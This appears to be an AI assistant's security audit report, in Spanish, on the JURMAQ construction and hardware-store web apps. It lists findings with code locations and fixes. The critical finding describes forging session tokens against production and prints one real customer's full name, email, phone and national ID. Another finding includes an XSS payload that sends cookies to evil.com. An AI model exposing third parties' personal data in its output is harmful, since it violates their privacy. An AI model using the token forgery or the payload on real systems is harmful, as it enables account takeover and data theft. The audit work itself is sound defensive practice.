I'll write the final security audit report for the JURMAQ owner. Let me organize the 18 confirmed findings by severity.

# Reporte Final de Auditoría de Seguridad — JURMAQ

**Alcance:** monorepo JURMAQ (constructora `jurmaq.cl` + barraca `barraca.jurmaq.cl`, Next.js + Vercel + Supabase)
**Fecha:** 2026-06-12
**Hallazgos confirmados:** 18 (2 críticos, 1 medio-pago + 1 medio-XSS, varios bajos/info) · **Falsos positivos descartados:** 5 · **Controles verificados correctos:** 64

---

## 1. Veredicto general

La postura de seguridad de JURMAQ es **mayormente sólida**: el diseño de fondo es bueno. La autenticación SSO de Google, el RBAC por módulo+acción, la firma de webhooks de MercadoPago y KLAP, el cálculo de precios server-side, la verificación de OTP de firma de contratos, el manejo de subidas de cédula y el enmascaramiento de PII en logs están **bien implementados y verificados en vivo**. La gran mayoría de las cosas que se revisaron están bien hechas (64 controles confirmados correctos).

**PERO hay UN problema crítico activo y explotable en producción AHORA MISMO** que opaca lo demás: en `barraca.jurmaq.cl`, cualquier persona en Internet, sin contraseña ni cuenta, puede hacerse pasar por cualquier cliente y extraer los datos personales (nombre, email, teléfono, RUT) de toda la base de clientes. Lo demostramos en vivo contra producción. La causa es una sola variable de entorno que quedó sin activar en barraca (en constructora SÍ está activada y por eso constructora está protegida). **La acción más urgente es activar `AUTH_SESSIONS_ENABLED=true` en el proyecto Vercel de barraca hoy.** Hecho eso, el riesgo crítico cae a cero y quedan únicamente mejoras de mediano/bajo impacto.

---

## 2. Hallazgos confirmados (ordenados por severidad)

> Nota: tres de los hallazgos críticos describen **el mismo defecto raíz** desde tres dimensiones de auditoría distintas (authn-authz, supabase-rls-rpc, deps-config-headers). Los consolido a continuación como **C-1** para que quede claro que es **un solo problema con un solo fix**, no tres.

---

### 🔴 CRÍTICO

#### C-1. Tokens de sesión del portal de clientes (barraca) son **forjables** → impersonación total + fuga masiva de PII (CONFIRMADO EN VIVO en producción)

**Qué es.** El portal de clientes de barraca usa tokens "dual-mode": si la variable `AUTH_SESSIONS_ENABLED` está en `'true'`, emite y exige un JWT firmado (seguro); si **no** lo está, cae a un token *legacy* de formato `base64("<id>:<random>")` que **no tiene firma ni secreto**. La única validación es que la parte `random` tenga 32+ caracteres — pero ese `random` nunca se guarda ni se compara contra nada: es decorativo. Resultado: cualquiera puede fabricar un token válido para **cualquier cliente** con solo conocer su `id` numérico (los ids son secuenciales: 1, 2, 3, 4…).

En producción, barraca tiene ese flag **apagado** (verificado en vivo), así que el modo forjable está activo. Constructora tiene el flag **encendido** y por eso está protegida hoy (su token forjado da 401).

**Dónde:**
- `apps/barraca/src/lib/barraca-auth.ts:42-58` (parseo del token legacy; el chequeo `random.length>=32` está en la línea 53; la desactivación del legacy está en la línea 46: `if (env.AUTH_SESSIONS_ENABLED) return null`)
- `apps/barraca/src/app/api/auth/route.ts:25` (emisión legacy `Buffer.from(\`${userId}:${random}\`)`)
- `packages/shared/src/env.ts:196-199` (el flag es `.optional()` → default `false`)
- Rutas afectadas: `apps/barraca/src/app/api/cuenta/{wishlist,exportar,reviews}/route.ts` y la acción `profile`/`update` de `/api/auth`
- Mismo patrón latente en constructora: `apps/constructora/src/lib/cuenta-auth.ts:100-143`

**Cómo se explota (PROBADO EN VIVO, sin tocar datos destructivamente):**
1. `GET /api/cuenta/wishlist` sin token → **401**; con token forjado `Bearer base64("2:"+40_chars)` y header `Origin: https://barraca.jurmaq.cl` → **HTTP 200**.
2. Control negativo: token forjado para id inexistente (99999) → **401**; para ids reales (1, 2) → **200** → prueba que es impersonación genuina, no aceptación a ciegas.
3. `POST /api/auth {action:'profile'}` con el token forjado del id=2 devolvió la **PII completa** del cliente real "Jorge Ubilla": email `jrgubival@gmail.com`, teléfono `+56931422352`, RUT `21622343-8`, más su historial de cotizaciones.
4. El atacante itera ids `1..N` → **exfiltración masiva de PII de toda la base** (violación de la Ley 21.719).

**Por qué las defensas no protegen:** las rutas `/api/cuenta/*` usan `supabaseAdmin` (service_role), que **bypasea RLS**, así que el filtro por dueño es inútil porque el id lo controla el atacante. El middleware solo cuida `/admin/*`. `isValidOrigin` es solo anti-CSRF de navegador: con `curl` basta enviar el header `Origin` permitido (y el `GET /wishlist` ni siquiera tiene chequeo de origin).

**Una corrección al hallazgo (no baja la severidad):** `/api/cuenta/eliminar` además exige la contraseña de la víctima vía `bcrypt.compare`, así que **un token forjado por sí solo NO permite borrar cuentas**. El borrado masivo NO es posible. Lo crítico es la **lectura/exfiltración de PII** y el cambio de perfil (`action:'update'`, sin barrera de contraseña).

**Fix exacto (orden de prioridad):**
1. **AHORA:** confirmar que `migrate-user-sessions.sql` está aplicada en barraca, y luego setear `AUTH_SESSIONS_ENABLED=true` en el proyecto Vercel de **barraca** (Production + Preview), tal como ya está en constructora. Esto hace que `parseBarracaUserToken` rechace todo token legacy (línea 46) atómicamente.
2. **Verificar post-deploy:** repetir el test del forjado — debe dar **401**.
3. **Endurecer (no opcional a mediano plazo):** **eliminar por completo la rama legacy de parseo** en ambos parsers (`barraca-auth.ts:42-58` y `cuenta-auth.ts:134-142`), para que un mal deploy que apague el flag no vuelva a abrir el agujero. Fail-closed, no fail-open.
4. Confirmar que la emisión firmada NO cae silenciosamente al fallback legacy (`route.ts:41` y `cuenta-auth.ts:88` hacen `catch → generate legacy`); con la tabla aplicada ese fallback no debe dispararse.

---

### 🟠 MEDIO

#### M-1. Cupón aplicado al total pero NO a la preferencia de MercadoPago → **sobrecobro al cliente** + orden congelada en `pago_discrepancia`

**Qué es.** Cuando un cliente aplica un cupón válido, el descuento se resta **solo** del campo `total`, pero los ítems mantienen su precio unitario completo (no se prorratea ni se agrega línea de descuento). Luego la preferencia de MercadoPago se arma desde los `items` (precio full), ignorando el `total` con descuento. Entonces **MercadoPago le cobra al cliente el precio sin descuento**, y cuando llega el webhook, la validación compara `total` (con descuento) vs `transaction_amount` (full), no cuadran, y marca la orden como `pago_discrepancia` **sin marcarla pagada**. Cada orden con cupón pagada por MercadoPago (a) sobrecobra al cliente el monto del descuento, y (b) queda atascada sin procesarse, exigiendo intervención manual.

**Dónde:**
- `apps/barraca/src/app/api/cotizaciones/route.ts:183-194` (descuento aplicado solo a `total`)
- `apps/barraca/src/lib/payments.ts:28-48` (`createMercadoPagoPreference` arma desde `items` con `unit_price: item.precio`, ignora `total`)
- `apps/barraca/src/app/api/pagos/webhook/route.ts:177-194` (validación de monto que dispara `pago_discrepancia`)

**Cómo se explota (no es ataque — es bug de integridad para clientes legítimos):** carrito de $100.000, cupón -$20.000 → cotización con `total=$80.000` e items por $100.000 → MercadoPago cobra **$100.000** → webhook no cuadra → `pago_discrepancia`. El cliente pagó **$20.000 de más** y su pedido no se procesa.

**Fix exacto:** hacer que la suma cobrada por MercadoPago iguale `cotizacion.total`. Lo más simple y robusto: en `/api/pagos`, en vez de pasar los items con precio full, **cobrar un único ítem `unit_price = cotizacion.total`** (ej. "Pedido COT-xxxx"), o prorratear cada `unit_price` por el factor `cotizacion.total / sum(items)`. Verificar también que `sendPaymentLinkEmail` muestre el total con descuento.

---

#### M-2. JSON-LD inyectado sin escapar el breakout de `</script>` → **XSS almacenado** de segundo orden en páginas SEO públicas

**Qué es.** Todos los bloques JSON-LD se inyectan con `dangerouslySetInnerHTML={{ __html: JSON.stringify(obj) }}`, y el objeto contiene campos dinámicos de la DB (`producto.nombre`, `categoria.nombre`, `maquinaria.nombre`/`descripcion`). `JSON.stringify` escapa comillas y backslash pero **NO escapa `<`, `>` ni `/`**. Si uno de esos campos contiene `</script><script>...</script>`, se cierra el bloque `<script type="application/ld+json">` y se ejecuta JS arbitrario en la página pública. Además, al guardar productos el `nombre`/`descripcion` se persiste **sin sanitizar** (`stripHtml`).

Requiere un actor con sesión válida (vendedor/admin) para escribir el campo malicioso (creación/edición está auth-guardada), por lo que es **XSS almacenado de actor privilegiado / segundo orden**, no explotable por anónimo — pero el JS inyectado se ejecuta para **todo visitante anónimo** de esas páginas SEO de alto tráfico. La CSP **no protege** porque lleva `'unsafe-inline'` (ver L-XSS abajo).

**Dónde:**
- `apps/barraca/src/app/producto/[slug]/page.tsx:326-327`
- `apps/barraca/src/app/categorias/[slug]/page.tsx:354-363` y `.../en/[ciudad]/page.tsx:407-416`
- `apps/constructora/src/app/maquinarias/[id]/page.tsx:615-621` y `.../en/[ciudad]/page.tsx:284`
- `packages/shared/src/seo/jsonld.ts`
- Escritura sin sanitizar: `apps/barraca/src/app/api/productos/route.ts:143` y `[slug]/route.ts:105`

**Cómo se explota:** un usuario rol vendedor edita un producto y pone como nombre `Fierro</script><script>fetch('https://evil.com/c?'+document.cookie)</script>`. Se hornea (ISR `revalidate=600`) y se sirve a cada visitante anónimo en ≤10 min.

**Fix exacto:** crear un helper `safeJsonLd(obj)` en `packages/shared/src/seo/` que haga `JSON.stringify(obj).replace(/</g,'\\u003c').replace(/>/g,'\\u003e').replace(/&/g,'\\u0026')` y usarlo en **todos** los `dangerouslySetInnerHTML` de JSON-LD. Como defensa adicional, aplicar `sanitizeString`/`stripHtml` a `nombre`/`descripcion` en POST/PUT de productos y categorías.

---

### 🟡 BAJO

#### L-1. Default inseguro de sesión legacy en constructora (bomba de tiempo)

Mismo patrón fail-open que C-1, pero en constructora hoy **no es explotable** (tabla `clientes` vacía, sin columna `activo`, `user_sessions` vacía → el portal no está funcionalmente desplegado y el flag está encendido). Riesgo: si se puebla `clientes` y se olvida el flag en cualquier re-deploy/preview de Vercel, revierte a sesiones forjables. **Fix:** invertir el default a fail-safe (rechazar legacy salvo opt-in explícito de dev), eliminar el path legacy, documentar `AUTH_SESSIONS_ENABLED` como requerido en `.env.example`.
**Dónde:** `apps/constructora/src/lib/cuenta-auth.ts:21,63-66,100-143`; `packages/shared/src/env.ts:196-199`.

#### L-2. `rateLimitPersistent` hace **fail-OPEN** ante errores de DB no clasificados en el login admin

Si la RPC de rate-limit falla por timeout/saturación/error transitorio (código != `PGRST202`), el limiter del login admin (5/15min) devuelve `{success:true}` y permite el intento. No es disparable a demanda por un atacante externo (la query es baratísima y la consulta de credenciales falla cerrada en el mismo incidente), y bcrypt sigue corriendo — por eso es bajo. **Fix:** para login admin, fail-closed (o fallback estricto al limiter en memoria) ante errores DB inesperados, o al menos emitir alerta/audit.
**Dónde:** `packages/shared/src/rate-limit/index.ts:137-139` (usado por `packages/shared/src/auth/index.ts:80`).

#### L-3. Enumeración de clientes legacy sin contraseña vía respuesta 412 distinta en login (constructora)

El login devuelve **412 `configurar_password`** (distinguible) para un cliente real sin `password_hash`, vs 401 genérico para email inexistente/password incorrecto → filtra el subconjunto de emails reales sin contraseña, útil para spear-phishing. Hoy **no explotable** (migración sin aplicar, tabla vacía); latente hasta que se importen clientes legacy. **Fix:** devolver el mismo 401 genérico y disparar el correo "configura tu contraseña" de forma silenciosa, igual que `handleForgot`.
**Dónde:** `apps/constructora/src/app/api/cuenta/auth/route.ts:110-124`.

#### L-4. `anon` conserva grant INSERT en `cotizaciones_arriendo` → spam directo vía PostgREST

La política `cot_arriendo_anon_insert` permite a `anon` insertar cotizaciones `borrador`/`enviada` directamente con la anon key (bypaseando rate-limit, origin y validación del endpoint Next.js). Confirmado en vivo (probe llega hasta FK violation con un `maquinaria_id` válido). Impacto **acotado**: solo spam/basura (SELECT revocado → sin lectura de PII; estado limitado a no-privilegiados; **NO** dispara emails — esos los manda el código Next, no un trigger DB). **Fix:** `REVOKE INSERT ON public.cotizaciones_arriendo FROM anon` (la app ya crea vía service_role), o endurecer la policy con un guard anti-abuso a nivel DB.
**Dónde:** `apps/constructora/scripts/migrate-arriendo-v2-03-cotizaciones-arriendo.sql:113-115`.

#### L-5. Ruta de cotización manual (sin carrito) confía en el `precio` enviado por el cliente

`POST /api/cotizaciones` sin `sessionId` acepta `item.precio` del cliente (solo cap duro de 50M CLP/ítem). Un cliente puede crear una cotización con precio=1. Confirmado en vivo (creó COT con total=$50). **Pero** la cotización queda en `pendiente` y **todo paso a pago exige un admin autenticado** que ve el desglose completo (precio fraudulento visible) antes de aprobar. La pérdida requiere negligencia del admin — defensa-en-profundidad, no bypass técnico. **Fix:** para ítems con `producto_id`, validar server-side que `item.precio` ≥ precio en DB; para ítems libres, marcar `requiere_revision_precio=true`.
**Dónde:** `apps/barraca/src/app/api/cotizaciones/route.ts:104-125`.

#### L-XSS. CSP con `script-src 'unsafe-inline' 'unsafe-eval'` anula la protección anti-XSS

Confirmado en vivo en ambos dominios. La CSP es razonable salvo que `'unsafe-inline'`/`'unsafe-eval'` significan que cualquier script inline inyectado (ej. el breakout de M-2) se ejecuta sin restricción. No explotable por sí solo (no hay sink alcanzable por anónimo), pero **elimina el backstop** de M-2. **Fix:** migrar a CSP basada en nonce (Next 13+ App Router lo soporta vía middleware) y quitar `'unsafe-eval'`. Combinado con el fix de M-2 cierra el vector.
**Dónde:** `apps/constructora/next.config.ts:55`; `apps/barraca/next.config.ts:59`.

#### L-MAIL. Plantillas de email interpolan datos de usuario sin `escapeHtml` (defensa-en-profundidad)

Varias plantillas (`cotizacion-admin.ts`, `cotizacion.ts`, `contraoferta.ts`, `payment-link.ts`, `welcome.ts`, `purchase-thank-you.ts`) interpolan datos del cliente sin `escapeHtml`, aunque el helper existe y otras plantillas sí lo usan. El path público está mitigado por `sanitizeString` upstream (stripHtml borra etiquetas), y los clientes de correo modernos neutralizan handlers — no hay ejecución de JS hoy. Hueco concreto menor: el campo `email` en `mailto:${email}` puede romper el atributo `href` superando `stripHtml`+`isValidEmail`. **Fix:** envolver toda interpolación no estática con `escapeHtml`.
**Dónde:** `packages/shared/src/mail/templates/cotizacion-admin.ts:49,53,57` y otras.

#### L-OR. Algunos `.or()` de PostgREST usan `escapeLikePattern` en vez de `escapeOrFilter` (filter injection acotada)

Algunos `.or()` con input de usuario usan `escapeLikePattern` (escapa `% _ \` pero no `, ( )`), permitiendo inyectar cláusulas OR extra. Confirmado mecánicamente en vivo, **pero impacto neutralizado**: la búsqueda pública corre bajo anon+RLS (la inyección se ANDea con RLS → cero data nueva expuesta) y las rutas admin están tras `requirePermission` sobre la misma tabla que el usuario ya puede leer. Consistencia/hardening. **Fix:** estandarizar a `escapeOrFilter` en todos los `.or()` con input de usuario.
**Dónde:** `apps/barraca/src/lib/search.ts:71,79,94,106,120,126`; `apps/barraca/src/app/api/cotizaciones/route.ts:32-35`; `apps/constructora/src/app/api/admin/contratos/route.ts:44-45`; `apps/constructora/src/app/api/solicitudes/route.ts:27-28`.

#### L-NOTAS. `/api/cuenta/me` devuelve el campo interno `clientes.notas` al propio cliente

El endpoint hace `SELECT ... notas ...` y devuelve el `perfilFull` completo. `notas` es un campo **interno editable solo por admins** ("cliente moroso", flags de riesgo, etc.). El cliente lo lee con `fetch('/api/cuenta/me')` aunque la UI no lo muestre. Solo su propia fila (sin exposición de terceros). **Fix:** whitelist de campos en la respuesta: `const { notas, ...perfilPublico } = perfilFull ?? {}`.
**Dónde:** `apps/constructora/src/app/api/cuenta/me/route.ts:30,52`.

#### L-XLSX. `xlsx` (SheetJS) 0.18.5 con CVEs high sin parche en npm (Prototype Pollution + ReDoS)

`xlsx@0.18.5` afectado por GHSA-4r6h-8v6p-xvw6 (Prototype Pollution, parchado en ≥0.19.3) y GHSA-5pgg-2g8v-p4x9 (ReDoS, ≥0.20.2). SheetJS dejó de publicar en npm, así que `pnpm update` no lo resuelve. Hay 2 rutas que hacen `XLSX.read()` sobre input de usuario (`promociones-import-helpers.ts:102`, `import-barraca-smart.ts:148`), **pero están tras `requirePermission` (solo roles admin/gerente) + origin + cap de tamaño + rate-limit** (probado: 403 sin auth). El "usuario que sube xlsx malicioso" debe ser un insider altamente privilegiado. **Fix:** `pnpm add https://cdn.sheetjs.com/xlsx-0.20.3/xlsx-0.20.3.tgz` en ambas apps (≥0.20.2).
**Dónde:** `apps/constructora/package.json`, `apps/barraca/package.json` (`xlsx ^0.18.5`).

---

### ⚪ INFO (hardening / consistencia, sin vector explotable)

- **I-1. Dos funciones `SECURITY DEFINER` sin `SET search_path = ''`** (`apps/constructora/scripts/migrate-iva-f29-02-triggers.sql:74,143`). Linter 0011 de Supabase. No alcanzable: son triggers `AFTER UPDATE` sobre tablas que `anon`/`authenticated` no pueden escribir (confirmado 42501 en vivo). **Fix:** agregar `SET search_path = ''` y schema-calificar `iva_libro_ventas → public.iva_libro_ventas`, etc.
- **I-2. Bucket público `cotizaciones` recibe uploads anónimos servidos por URL pública** (`apps/barraca/src/app/api/upload/route.ts:87,99-103`). Confirmado `public=true` en vivo (los otros 3 buckets son privados). Hoy solo guarda fotos de precios de competencia que el propio usuario sube; sin PII de terceros, no enumerable. Riesgo: si un dev reusa el bucket para PII, quedaría público. **Fix:** migrar a privado con signed URLs de TTL corto, o documentar que `cotizaciones` jamás debe recibir PII.
- **I-3. `getClienteFromRequest` filtra por columna `activo` inexistente** en `clientes` (`apps/constructora/src/lib/cuenta-auth.ts:195-202`). **Fail-closed** (seguro), pero rompería el portal cliente de constructora apenas se cree el primer cliente (todo login daría 401). Bug funcional, no de seguridad. **Fix:** aplicar `migrate-clientes-auth.sql` a producción o alinear el filtro al esquema real; agregar test de integración de login real.

---

## 3. Plan de remediación priorizado

| # | Hallazgo | Severidad | Esfuerzo | Prioridad | Acción |
|---|----------|-----------|----------|-----------|--------|
| 1 | **C-1** Token forjable barraca | 🔴 Crítico | **Muy bajo** (1 env var) | **HOY** | Setear `AUTH_SESSIONS_ENABLED=true` en Vercel barraca + verificar 401 |
| 2 | C-1 (hardening) Eliminar rama legacy en ambos parsers | 🔴 Crítico | Medio | Esta semana | Borrar path base64; fail-closed permanente |
| 3 | M-1 Cupón vs MercadoPago | 🟠 Medio | Bajo | Esta semana | Cobrar 1 ítem `unit_price = total` o prorratear |
| 4 | M-2 / L-XSS XSS JSON-LD + CSP | 🟠 Medio | Medio | Esta semana | Helper `safeJsonLd` + sanitizar nombre/descripcion + CSP nonce |
| 5 | L-1 Default inseguro constructora | 🟡 Bajo | Medio | Antes de habilitar portal constructora | Invertir default + documentar flag |
| 6 | L-NOTAS `notas` en `/cuenta/me` | 🟡 Bajo | Muy bajo | Sprint | Whitelist de campos |
| 7 | L-4 INSERT anon en cotizaciones_arriendo | 🟡 Bajo | Bajo | Sprint | `REVOKE INSERT FROM anon` |
| 8 | L-XLSX dependencia vulnerable | 🟡 Bajo | Bajo | Sprint | Actualizar a ≥0.20.2 vía CDN SheetJS |
| 9 | L-2 fail-open rate-limit admin | 🟡 Bajo | Bajo | Backlog | Fail-closed o alerta |
| 10 | L-3 enumeración 412 / L-5 precio manual / L-MAIL / L-OR | 🟡 Bajo | Bajo | Backlog | Ver fixes por hallazgo |
| 11 | I-1 / I-2 / I-3 | ⚪ Info | Bajo | Backlog | Hardening/consistencia |

**Camino de máximo impacto / mínimo esfuerzo:** la fila #1 (una variable de entorno) elimina el único riesgo crítico activo. Las filas #2–#4 cierran los riesgos serios restantes y son de esfuerzo bajo/medio.

---

## 4. Cobertura de la auditoría

Se auditaron **7 dimensiones**: (1) authn-authz, (2) public-api-idor, (3) supabase-rls-rpc, (4) payments, (5) web-xss-redirect-ssrf, (6) secrets-pii-uploads, (7) deps-config-headers.

**Se descartaron 5 falsos positivos** (verificados como no explotables / ya mitigados), lo que demuestra que los hallazgos reportados pasaron filtro adversarial:
- *Comisión `porcentaje_comision` en endpoint público de maestros* — exposición intencional por diseño (alimenta una landing pública), no fuga.
- *nodemailer 7.0.13 CRLF/SMTP injection* — dependencia declarada pero **nunca importada**; sin camino de código alcanzable.
- *Transitivas moderate (postcss/ws/qs vía next/puppeteer/twilio)* — presentes en lockfile pero sin vector alcanzable en el uso real.
- *`CRON_SECRET` comparado con `===` (no timing-safe)* — el secreto es de alta entropía y el timing leak no es práctico; ya fail-closed.
- *CSP `unsafe-inline`/`unsafe-eval`* (como vuln independiente) — reclasificada como hardening bajo (L-XSS), sin sink alcanzable por sí sola.

**64 controles verificados como correctos** (resumen por dimensión, da confianza real):

- **Auth/SSO:** SSO Google fail-closed y no inyectable (regex de email anclada, `email_verified === true` estricto, `maybeSingle()`, jwt callback re-busca el usuario en DB ignorando claims de Google). Aislamiento de scope con cookies `__Host-` confirmado en vivo (barraca y constructora separadas a nivel de navegador + doble cinturón en `session()`).
- **RBAC:** `requirePermission`/`requireRole` por módulo+acción en **cada** ruta `/api/admin/*` (40+ constructora, 17 barraca) — ninguna depende solo del middleware (confirmado 403 sin sesión). Self-protection (no degradarte/borrarte como último admin). Whitelisting de campos por rol en máquinas (operador solo toca `estado`).
- **Tokens/sesión firmada:** `session-token.ts` correcto cuando se usa (HMAC-SHA256, `exp`, `scope`, SELECT real en `user_sessions` con revocación efectiva, `timingSafeEqual`, fail-closed). El defecto C-1 es que barraca **no lo usa por defecto**, no el módulo en sí.
- **OTP firma de contratos:** verificación de identidad (RUT + cédula con magic bytes) antes de emitir, OTP hasheado con bcrypt, `MAX_ATTEMPTS=5` con CAS atómico (cierra TOCTOU), rate-limits por IP/contrato, audit-log.
- **Pagos:** webhooks MercadoPago **y** KLAP con firma HMAC + timing-safe + anti-replay + fail-closed (probado: 401/403 sin firma). MercadoPago re-consulta el monto real vía API (no confía en el body). Idempotencia atómica. Precios **siempre server-side** desde DB (carrito, cotización, arriendo, cupón). KLAP: holds/capturas/cargos clampados y admin-gated.
- **IDOR/BOLA:** sin IDOR en `/api/cuenta/*` (todo scopeado por sesión, 403/404 anti-enumeración). Tokens de firma/entrega son `crypto.randomBytes(32)` (256 bits, no secuenciales). Sin mass-assignment (inserts con campos explícitos).
- **RLS:** verificado en vivo con anon key — `barraca_suscriptores`/`barraca_cotizaciones`/`pagos_eventos`/`klap_holds` deniegan lectura anónima. RPC `verificar_disponibilidad` endurecida (STABLE, `search_path=''`, EXECUTE solo a service_role).
- **Web:** sin open redirect (`safeCallback` rechaza `//` y absolutos; probado en vivo). Sin SSRF (todos los fetch con host fijo). CSRF endurecido (`isValidOrigin` no confía en Host). Security headers completos (HSTS, nosniff, frame-ancestors, Permissions-Policy).
- **Secrets/PII:** enmascaramiento (`maskEmail`/`maskRut`/`hid`) consistente en rutas sensibles. Cédulas en bucket privado con signed URLs. Ningún secreto bajo `NEXT_PUBLIC_*`. service_role solo server-side.
- **Deps/config:** Next.js 16.2.6 (parchado contra CVE-2025-29927). Los 9 crons fail-closed con `CRON_SECRET`. `images.remotePatterns` acotado (sin `**` → sin SSRF por el optimizador). Defaults seguros en Zod env.

**Conclusión de cobertura:** el codebase está bien construido en lo fundamental. El hallazgo crítico C-1 es una **mala configuración de una variable en un proyecto Vercel** (no un defecto de diseño profundo), y la prueba de que constructora **sí** está protegida confirma que el mecanismo seguro existe y funciona — solo falta encenderlo en barraca. Atendido eso, JURMAQ queda en una postura de seguridad robusta.